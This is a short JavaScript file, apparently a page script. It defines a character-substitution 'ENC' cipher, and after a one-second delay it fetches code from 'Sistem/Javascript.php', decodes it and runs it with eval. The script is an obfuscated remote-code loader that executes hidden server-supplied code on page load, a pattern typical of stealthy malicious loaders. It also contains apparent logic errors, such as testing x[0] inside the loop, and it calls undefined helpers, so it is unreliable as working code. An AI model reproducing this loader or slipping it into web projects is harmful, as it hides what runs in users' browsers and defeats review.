ENC = function(x) {
	var _ = hex(eval($)),
	a = '~!@#$%^&*()_+`1234567890-=qwertyuiop[]\\asdfghjkl;\'zxcvbnm,./QWERTYUIOP{}|ASDFGHJKL:"ZXCVBNM<>? ',
	b=null,
	c=x.length,
	d='',
	e='`',
	f='';
	for (var i = 0; i < c; i++) {
		if (f==='?') {
			if (x[0]==e) {
				if (i !== c-1) {
					b=a[parseInt(x.substr(++i,2))];
				}
			}else{
				b=a.indexOf(x[i]).toString();
				if(b.length < 2){b='0'+b};
			};
			d+=b;
			f='';
		} else {
			if (x[0]==e) {
				if (i !== c-1) {
					b=_[parseInt(x.substr(++i,2))];
				}
		}else{
				b=_.indexOf(x[i]).toString();
				if(b.length < 2){b='0'+b};
			};
			d+=b;
			f='?';
		}
	};
	if (x[0]!==e) {d=e+d}else{d=hex(substr(d,0,d.length-1))};
	if (x == '') {d=''};
	return d;
};
setTimeout(function() {
	var REQ = new XMLHttpRequest();
	REQ.open('GET', 'Sistem/Javascript.php?_='+eval($), true);
	REQ.onreadystatechange = function(){
		if( REQ.readyState == 4 ){
			eval(ENC(REQ.responseText));
		}
	};
	REQ.send()
},1000);